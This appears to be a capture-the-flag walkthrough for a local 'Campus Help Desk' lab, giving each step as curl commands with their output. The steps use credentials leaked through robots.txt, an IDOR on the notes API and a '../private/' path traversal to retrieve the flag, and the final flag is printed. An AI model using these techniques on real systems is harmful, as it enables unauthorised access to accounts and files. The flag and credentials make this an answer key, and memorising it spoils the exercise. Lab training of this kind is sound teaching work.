# Campus Help Desk CTF: Steps as curl Commands

The requests from `Campus Help Desk CTF.postman_collection.json`, rewritten as `curl` commands in the same folder order. Every command was run against the local lab, and the outputs shown come from that run.

## Before you start

The commands are written for **Git Bash** (or any bash/zsh shell). Run them from the project folder with the lab up (`docker compose up -d`).

```bash
BASE=http://127.0.0.1:8080
```

| curl flag | Meaning | Postman equivalent |
|---|---|---|
| `-s` | Silent (no progress bar) | n/a |
| `-i` | Print response headers and body | Response **Headers** tab |
| `-d "a=1&b=2"` | POST the data as `x-www-form-urlencoded` | **Body → x-www-form-urlencoded** |
| `-c cookies.txt` | Save cookies the server sets into a file | Postman's cookie jar |
| `-b cookies.txt` | Send the cookies saved in that file | Postman sending cookies automatically |
| `-o /dev/null -w "%{http_code}\n"` | Print only the status code | Status shown next to the response |

curl doesn't follow redirects unless you add `-L`. That's why login shows `303` here where Postman showed `200`.

> **PowerShell users:** in Windows PowerShell, `curl` is an alias for `Invoke-WebRequest`, which takes different options. Type **`curl.exe`** instead, set the variable with `$BASE = "http://127.0.0.1:8080"`, and use `$BASE` exactly as below. Replace `-o /dev/null` with `-o NUL`.

---

## 01 Recon

Before logging in, the private areas reject you:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/notes"
# 401
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/sitemap.xml"
# 404
```

Check `robots.txt`:

```bash
curl -s -i "$BASE/robots.txt"
```
```
HTTP/1.0 200 OK
Content-Type: text/plain; charset=utf-8

User-agent: *
Disallow: /backups/helpdesk.txt
```

Open the disallowed path anyway:

```bash
curl -s "$BASE/backups/helpdesk.txt"
```
```
Campus Help Desk: old orientation deployment notes
The trainee account was left active while orientation support was tested.
username: trainee
password: trainee-ba0b1f4a59107c56c5edfc7957e95829
login: /login
After signing in, read the trainee's support note about the locked welcome pack.
```

## 02 Login

Wrong credentials first, as a baseline:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -d "username=admin&password=admin" "$BASE/login"
# 401
```

Log in with the leaked credentials and **save the session cookie** to `cookies.txt`:

```bash
curl -s -i -c cookies.txt \
  -d "username=trainee&password=trainee-ba0b1f4a59107c56c5edfc7957e95829" \
  "$BASE/login"
```
```
HTTP/1.0 303 See Other
Location: /notes
Set-Cookie: helpdesk_session=…; Path=/; HttpOnly; SameSite=Lax
```

From here on, every request uses `-b cookies.txt`. Without it you get **401**, the same problem that came up in Postman when the cookie wasn't sent.

Find the link to your note:

```bash
curl -s -b cookies.txt "$BASE/notes" | grep -o 'href="/api[^"]*"'
# href="/api/notes?id=1"
```

## 03 Notes / IDOR

Your own note:

```bash
curl -s -b cookies.txt "$BASE/api/notes?id=1"
```
```json
{"id": 1, "owner": "trainee", "body": "Orientation request ORI-2042: tomorrow's welcome pack is locked. Your trainee note has been escalated. Staff keeps the next entry in the notes system."}
```

Change **only** the `id`:

```bash
curl -s -b cookies.txt "$BASE/api/notes?id=0"
# Note not found.   (404)

curl -s -b cookies.txt "$BASE/api/notes?id=2"
```
```json
{"id": 2, "owner": "staff", "body": "Staff escalation for ORI-2042. The orientation archive needs the access key below. The recovery document is private; ordinary downloads start in the public directory.", "archive_key": "92a56d0d30510472028863ad1c510a5b", "recovery_file": "orientation-recovery-39a5975b500b5e4c.txt"}
```

A `staff` note returned to the `trainee` session is the IDOR.

## 04 Documents

Save the values from note 2 so the commands stay short:

```bash
KEY=92a56d0d30510472028863ad1c510a5b
FILE=orientation-recovery-39a5975b500b5e4c.txt
```

Baseline with the form's default file:

```bash
curl -s -b cookies.txt "$BASE/download?key=$KEY&file=welcome.txt"
```
```
Orientation archive: public downloads are read from the public/ directory.
Recovery documents are stored in its sibling private/ directory.
The staff escalation note records the current recovery document name.
```

Controls showing the endpoint does check some things:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "$BASE/download?key=wrong&file=welcome.txt"
# 403  "Archive access requires the key recorded in the staff escalation note."

curl -s -o /dev/null -w "%{http_code}\n" "$BASE/download?key=$KEY&file=welcome.txt"
# 401  (no session cookie)

curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "$BASE/download?key=$KEY&file=$FILE"
# 404  "Document not found." (looked for it inside public/)
```

Path traversal into the sibling `private/` directory:

```bash
curl -s -b cookies.txt "$BASE/download?key=$KEY&file=../private/$FILE"
```
```
Orientation welcome pack: recovery code found.
Send this final code to the course teacher with your investigation notes.
CTF{final_47c98140fc84fbd9bf08b307933d4b4b_ebcabfd8faa97b7eb19f25a2919c6b09}
```

---

## Clean up

```bash
rm cookies.txt          # PowerShell: Remove-Item cookies.txt
docker compose down
```

`cookies.txt` holds a live session token, so delete it rather than submitting or committing it.
